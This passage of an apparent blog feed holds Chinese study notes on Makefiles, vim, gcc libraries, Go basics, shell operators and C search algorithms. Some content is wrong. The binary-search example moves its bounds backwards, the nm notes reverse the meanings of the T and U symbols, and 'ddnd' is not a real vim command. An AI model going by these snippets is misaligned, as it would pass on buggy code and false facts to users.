class="hljs-comment"># 规则之间的嵌套</span><br><span class="hljs-section">app:a.o b.o c.o</span><br>    gcc a.o b.o c.o -o app<br><span class="hljs-comment"># a.o 是第一条规则中的依赖</span><br><span class="hljs-section">a.o:a.c</span><br>    gcc -c a.c<br><span class="hljs-comment"># b.o 是第一条规则中的依赖</span><br><span class="hljs-section">b.o:b.c</span><br>    gcc -c b.c<br><span class="hljs-comment"># c.o 是第一条规则中的依赖</span><br><span class="hljs-section">c.o:c.c</span><br>    gcc -c c.c<br><br></code></pre></td></tr></table></figure><ol><li>如果我们的<code>makefile</code>写的不完整，就会直接自己自动推导</li></ol><h2 id="常用的指令"><a href="#常用的指令" class="headerlink" title="常用的指令"></a>常用的指令</h2><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230620213607086.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vim</title>
    <link href="/2023/06/18/linux/vim/"/>
    <url>/2023/06/18/linux/vim/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="vim的使用"><a href="#vim的使用" class="headerlink" title="vim的使用"></a>vim的使用</h1><h2 id="光表移动"><a href="#光表移动" class="headerlink" title="光表移动"></a>光表移动</h2><ol><li><p>移动到行尾</p><p><code>$</code></p></li><li><p>移动到行首</p><p><code>0</code></p></li><li><p>移动到整个文件的最开始</p><p><code>gg</code></p></li><li><p>移动到真个文件的最后</p><p><code>G</code></p></li><li><p>跳转行</p><p><code>nG</code></p></li></ol><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><ol><li><p>删除单词</p><p><code>dw</code> </p><p>但是注意必须要将光标置于最前方</p></li><li><p>删除光标前的字符串</p><p><code>d0</code></p></li><li><p>删除行</p><p><code>D</code>或者<code>dd</code></p></li><li><p>删除多行</p><p><code>ddnd</code>或者<code>ndd</code></p></li></ol><h2 id="撤销与反撤销"><a href="#撤销与反撤销" class="headerlink" title="撤销与反撤销"></a>撤销与反撤销</h2><ol><li><p>撤销</p><p><code>u</code></p></li><li><p>反撤销</p><p><code>ctrl+r</code></p></li></ol><h2 id="复制与粘贴"><a href="#复制与粘贴" class="headerlink" title="复制与粘贴"></a>复制与粘贴</h2><ol><li><p>粘贴到行的下边</p><p><code>p</code></p><p>小写的p</p></li><li><p>粘贴在行的上面</p><p><code>P</code></p><p>大写的<code>P</code></p></li><li><p>复制光标所在行</p><p><code>yy</code></p></li><li><p>从光标往下复制</p><p><code>nyy</code></p></li></ol><h2 id="可视化模式"><a href="#可视化模式" class="headerlink" title="可视化模式"></a>可视化模式</h2><ol><li><p>多行注释</p><p><code>ctrl+v</code></p><p><code>I</code></p><p>选择<code>//</code></p><p>退出<code>ESC</code></p></li><li><p>多行删除</p><p><code>ctrl+v</code></p><p>选择</p><p><code>D</code></p></li></ol><h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><ol><li><p>修改单个字符</p><p><code>r</code></p></li><li><p>连续修改</p><p><code>R</code></p></li><li><p>在末行模式下的替换</p><ul><li><p><code>:/s/main/mian</code></p><p>这样只会替换第一个关键字</p></li><li><p><code>:s/chg/zjy/g</code></p><p>替换光标所在行所有的<code>chg</code>为<code>zjy</code></p></li><li><p><code>:10,20s/chg/zjy/g</code></p><p>替换<code>10-20</code>行所有的<code>chg</code>为<code>zjy</code></p><p>如果不加<code>/g</code>就是替换掉每行第一个</p></li><li><p><code>:%s/chg/zjy/g</code></p><p>替换文章所有的</p></li></ul></li></ol><h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/vim/image-20230619081859573.png" alt="vim查找的相关指令"></p><h2 id="分屏操作"><a href="#分屏操作" class="headerlink" title="分屏操作"></a>分屏操作</h2><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/vim/image-20230619084238171.png" alt="image-20230619084238171"></p><h2 id="行跳转"><a href="#行跳转" class="headerlink" title="行跳转"></a>行跳转</h2><p><code>:n</code></p><h2 id="使用shell"><a href="#使用shell" class="headerlink" title="使用shell"></a>使用shell</h2><p>在末行模式下使用<code>shell</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wireshark</title>
    <link href="/2023/06/16/others/Wireshark/"/>
    <url>/2023/06/16/others/Wireshark/</url>
    
    <content type="html"><![CDATA[<h1 id="初始wireshark"><a href="#初始wireshark" class="headerlink" title="初始wireshark"></a>初始wireshark</h1>]]></content>
    
    
    
    <tags>
      
      <tag>Wireshark</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gcc</title>
    <link href="/2023/06/15/linux/gcc/"/>
    <url>/2023/06/15/linux/gcc/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="gcc的工作流程"><a href="#gcc的工作流程" class="headerlink" title="gcc的工作流程"></a>gcc的工作流程</h1><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gcc/gcc%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.png"></p><ol><li><p>预编译阶段会去除注释</p></li><li><p>编译会生成一个编译文件</p></li><li><p>汇编会得到一个二进制文件</p></li><li><p>部分命令</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/gcc/gcc%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.png"></p></li><li><p>执行多文件时，一定要编译多个.c文件</p></li></ol><h1 id="制作动态库和静态库"><a href="#制作动态库和静态库" class="headerlink" title="制作动态库和静态库"></a>制作动态库和静态库</h1><h2 id="静态库的创建"><a href="#静态库的创建" class="headerlink" title="静态库的创建"></a>静态库的创建</h2><ol><li><p>静态库的命名格式(linux)</p><p>前缀是<code>lib</code></p><p>后缀是<code>.a</code></p><p>例如<code>libxxx.a</code></p></li><li><p>静态库的命名格式(windows)</p><p>前缀是<code>lib</code></p><p>后缀也是<code>lib</code></p><p>例如<code>libxxx.lib</code></p></li><li><p>静态库的链接</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230619194413609.png" alt="image-20230619194413609"></p><ul><li><p><code>ar</code>参数的使用</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230619194627222.png" alt="image-20230619194627222"></p></li><li><p>打包练习</p><p><code>ar rcs libxxx.a *.o</code></p><p>注意<code>.o</code>是已经编译的文件</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230619211403619.png" alt="image-20230619211403619"></p></li><li><p>使用<code>nm -C .o</code>查看所有定义</p><p><code>T</code>  是外部函数</p><p><code>U</code>  是本文件的函数</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230619213441041.png" alt="image-20230619213441041"></p></li></ul></li><li><p>静态库的使用</p><p>编译<code>.a</code>文件</p></li></ol><h2 id="动态库"><a href="#动态库" class="headerlink" title="动态库"></a>动态库</h2><ol><li><p>动态库的创建</p><p><img src="https://linux-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%99%E6%80%81%E5%BA%93%E5%92%8C%E5%8A%A8%E6%80%81%E5%BA%93/image-20230620111319001.png"></p></li><li><p>使用</p></li></ol><h2 id="动态库和静态库的优缺点比较"><a href="#动态库和静态库的优缺点比较" class="headerlink" title="动态库和静态库的优缺点比较"></a>动态库和静态库的优缺点比较</h2><ol><li>动态库运行效率低，但是占用的内存小，对于现代计算机而言，运行效率差别不大</li><li>现在大多都是发布的动态库</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go学习代码</title>
    <link href="/2023/06/14/go/go%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81/"/>
    <url>/2023/06/14/go/go%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="声明变量"><a href="#声明变量" class="headerlink" title="声明变量"></a>声明变量</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><br>    <span class="hljs-comment">//1.</span><br>    <span class="hljs-keyword">var</span> a <span class="hljs-type">int</span> = <span class="hljs-number">520</span><br>    fmt.Println(a)<br><br>    <span class="hljs-comment">//2.</span><br>    b := <span class="hljs-number">1314</span><br>    fmt.Println(b)<br><br>    <span class="hljs-comment">//3</span><br>    <span class="hljs-keyword">var</span> (<br>        c <span class="hljs-type">int</span> = <span class="hljs-number">959</span><br>        d <span class="hljs-type">int</span> = <span class="hljs-number">244</span><br>    )<br>    fmt.Println(c + d)<br><br>    <span class="hljs-comment">//4</span><br>    <span class="hljs-keyword">var</span> e = <span class="hljs-number">2023</span><br>    fmt.Println(e)<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="常量-模拟枚举"><a href="#常量-模拟枚举" class="headerlink" title="常量(模拟枚举)"></a>常量(模拟枚举)</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">//模拟枚举</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">iota,每行递增</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">const</span> (<br>    A = <span class="hljs-literal">iota</span><br>    B<br>    C<br>    D = <span class="hljs-number">20</span><br>    E<br>    F = <span class="hljs-literal">iota</span><br>    G = <span class="hljs-string">&quot;adh&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//设置const常量</span><br>    <span class="hljs-comment">//不能使用自动类型推导</span><br>    <span class="hljs-keyword">const</span> a <span class="hljs-type">int</span> = <span class="hljs-number">10</span><br>    <span class="hljs-keyword">const</span> b = <span class="hljs-number">20</span><br>    fmt.Println(a)<br>    fmt.Println(b)<br>    fmt.Println(A)<br>    fmt.Println(F)<br>    fmt.Println(G)<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="多返回值-三种"><a href="#多返回值-三种" class="headerlink" title="多返回值(三种)"></a>多返回值(三种)</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">int</span>) &#123;<br>    <span class="hljs-keyword">return</span> a, b, a + b<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add1</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> (c, d <span class="hljs-type">int</span>) &#123;<br>    <span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add2</span><span class="hljs-params">(a <span class="hljs-type">int</span>, b <span class="hljs-type">int</span>)</span></span> (sum <span class="hljs-type">int</span>) &#123;<br>    sum = a + b<br>    <span class="hljs-keyword">return</span> sum<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    a, b, sum := add(<span class="hljs-number">1</span>, <span class="hljs-number">4</span>)<br>    fmt.Printf(<span class="hljs-string">&quot;%v+%v=%v&quot;</span>, a, b, sum)<br><br>    c, d := add1(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)<br>    fmt.Println(c, d)<br><br>    sum1 := add2(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>)<br>    fmt.Println(sum1)<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="切片的声明"><a href="#切片的声明" class="headerlink" title="切片的声明"></a>切片的声明</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//直接声明并且初始化</span><br>    ints := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>    <span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints &#123;<br>        fmt.Println(v)<br>    &#125;<br><br>    <span class="hljs-comment">//先声明再创建空间</span><br>    <span class="hljs-keyword">var</span> ints2 []<span class="hljs-type">int</span><br>    ints2 = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">2</span>)<br>    <span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ints2 &#123;<br>        fmt.Println(v)<br>    &#125;<br>    fmt.Println(ints)<br><br>    ints3 := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>&#125;<br>    fmt.Println(ints3)<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="容量和长度"><a href="#容量和长度" class="headerlink" title="容量和长度"></a>容量和长度</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//容量和长度</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    ints := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">2</span>)<br>    fmt.Printf(<span class="hljs-string">&quot;len:%d   cap:%d   ints:%v&quot;</span>, <span class="hljs-built_in">len</span>(ints), <span class="hljs-built_in">cap</span>(ints), ints)<br>    ints = <span class="hljs-built_in">append</span>(ints, <span class="hljs-number">1</span>)<br>    fmt.Printf(<span class="hljs-string">&quot;len:%d   cap:%d   ints:%v&quot;</span>, <span class="hljs-built_in">len</span>(ints), <span class="hljs-built_in">cap</span>(ints), ints)<br>    ints = <span class="hljs-built_in">append</span>(ints, <span class="hljs-number">2</span>)<br>    ints = <span class="hljs-built_in">append</span>(ints, <span class="hljs-number">3</span>)<br>    fmt.Printf(<span class="hljs-string">&quot;len:%d   cap:%d   ints:%v&quot;</span>, <span class="hljs-built_in">len</span>(ints), <span class="hljs-built_in">cap</span>(ints), ints)<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="数组，切片的截取"><a href="#数组，切片的截取" class="headerlink" title="数组，切片的截取"></a>数组，切片的截取</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//声明切片的几个方法</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    ints := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><br>    fmt.Println(ints[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]) <span class="hljs-comment">//[0,2)</span><br><br>    fmt.Println(ints[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(ints)]) <span class="hljs-comment">//打印全部的切片</span><br><br>    ints2 := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>    fmt.Println(ints2)<br>    fmt.Println(ints2[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>])  <span class="hljs-comment">//数组的=也可以截取</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="map的声明"><a href="#map的声明" class="headerlink" title="map的声明"></a>map的声明</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// map的声明</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//第一种方式</span><br>    map1 := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br>        <span class="hljs-string">&quot;one&quot;</span>:   <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;two&quot;</span>:   <span class="hljs-number">2</span>,<br>        <span class="hljs-string">&quot;three&quot;</span>: <span class="hljs-number">3</span>,<br>    &#125;<br>    fmt.Println(map1)<br><br>    <span class="hljs-comment">//第二种形式</span><br>    <span class="hljs-keyword">var</span> map2 <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">4</span>)<br>    fmt.Println(map2)<br><br>    <span class="hljs-comment">//第三种方式</span><br>    map3 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>, <span class="hljs-number">6</span>)<br>    fmt.Println(map3)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="delete的使用"><a href="#delete的使用" class="headerlink" title="delete的使用"></a>delete的使用</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    maps := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>&#123;<br>        <span class="hljs-string">&quot;one&quot;</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&quot;two&quot;</span>: <span class="hljs-number">2</span>,<br>    &#125;<br>    v, isHave := maps[<span class="hljs-string">&quot;two&quot;</span>]<br>    <span class="hljs-keyword">if</span> isHave == <span class="hljs-literal">true</span> &#123;<br>        fmt.Println(v)<br>    &#125;<br><br>    <span class="hljs-built_in">delete</span>(maps, <span class="hljs-string">&quot;two&quot;</span>)<br><br>    v, isHave = maps[<span class="hljs-string">&quot;two&quot;</span>]<br><br>    <span class="hljs-keyword">if</span> isHave != <span class="hljs-literal">true</span> &#123;<br>        fmt.Println(<span class="hljs-string">&quot;this is no value&quot;</span>)<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux复习文档</title>
    <link href="/2023/06/12/linux/linux%E5%A4%8D%E4%B9%A0%E6%96%87%E6%A1%A3/"/>
    <url>/2023/06/12/linux/linux%E5%A4%8D%E4%B9%A0%E6%96%87%E6%A1%A3/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="基本的知识"><a href="#基本的知识" class="headerlink" title="基本的知识"></a>基本的知识</h1><ol><li><p>命令执行成功过后返回一个<code>0</code></p></li><li><p>比较运算符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">-eq       //等于<br>-ne       //不等于<br>-gt        //大于 （greater）<br>-lt         //小于 （less）<br>-ge       //大于等于<br>-le        //小于等于<br>   <br></code></pre></td></tr></table></figure></li></ol><p><img src="/"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统简介</title>
    <link href="/2023/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    <url>/2023/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="计算机系统简介"><a href="#计算机系统简介" class="headerlink" title="计算机系统简介"></a>计算机系统简介</h1>]]></content>
    
    
    
    <tags>
      
      <tag>计算机组成原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>algorithm</title>
    <link href="/2023/06/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/algorithm/"/>
    <url>/2023/06/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/algorithm/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><h2 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h2><ol><li><p>就是普通的查找方法    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">int</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[],<span class="hljs-type">int</span> length,<span class="hljs-type">int</span> targetElement)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>        <span class="hljs-keyword">if</span>(targetElement==arr[i])&#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>   <br><span class="hljs-comment">//修改过后的代码</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">searchPlus</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[],<span class="hljs-type">int</span> length,<span class="hljs-type">int</span> targetElement)</span>&#123;<br>    <span class="hljs-type">int</span> n=length<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">while</span>(arr[n]!=targetElement&amp;&amp;n&gt;<span class="hljs-number">-1</span>)&#123;<br>        n--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="折中查找"><a href="#折中查找" class="headerlink" title="折中查找"></a>折中查找</h2><ol><li><p>折中查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> nums[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-type">int</span> left=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> right=<span class="hljs-keyword">sizeof</span>(nums)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)<span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> mid=(left+right)/<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">while</span>(left&lt;=right)&#123;<br>        <span class="hljs-keyword">if</span>(nums[mid]&gt;<span class="hljs-number">6</span>)&#123;<br>            right=mid+<span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums[mid]&lt;<span class="hljs-number">6</span>) &#123;<br>            left=mid<span class="hljs-number">-1</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;find it: %d&quot;</span>,nums[mid]);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        mid=(left+right)/<span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li><li><p>按比例查找（差值查找）</p><p>这个算法是根据这种算法来的，只是采用的比例不是<code>1/2</code> 